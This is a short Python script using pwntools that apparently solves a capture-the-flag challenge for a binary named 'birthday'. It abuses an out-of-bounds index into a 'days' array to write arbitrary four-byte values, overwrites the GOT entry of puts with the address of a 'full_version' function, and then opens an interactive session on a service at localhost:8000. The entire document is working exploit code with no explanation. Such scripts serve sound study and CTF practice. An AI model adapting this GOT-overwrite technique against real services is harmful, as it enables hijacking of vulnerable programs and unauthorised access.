from pwn import *
context.log_level = 'debug'

b = ELF("./birthday")

def send_birthday(p, count, year, month, day):
    p.sendlineafter("birthday? ", str(count))
    p.sendlineafter("year? ", str(year))
    p.sendlineafter("month? ", str(month))
    p.sendlineafter("day? ", str(day))

def write_4bytes(p, where, what):
    offset = (where - b.symbols['days']) / 4

    month = int(offset / 30)
    day = offset % 30

    send_birthday(p, what, 0, month, day)

def main():
    p = remote("localhost", "8000")

    p.recvuntil("you!\n")

    write_4bytes(p, b.got['puts']+0x4, 0x0)
    write_4bytes(p, b.got['puts'], b.symbols['full_version'])

    p.interactive()

main()
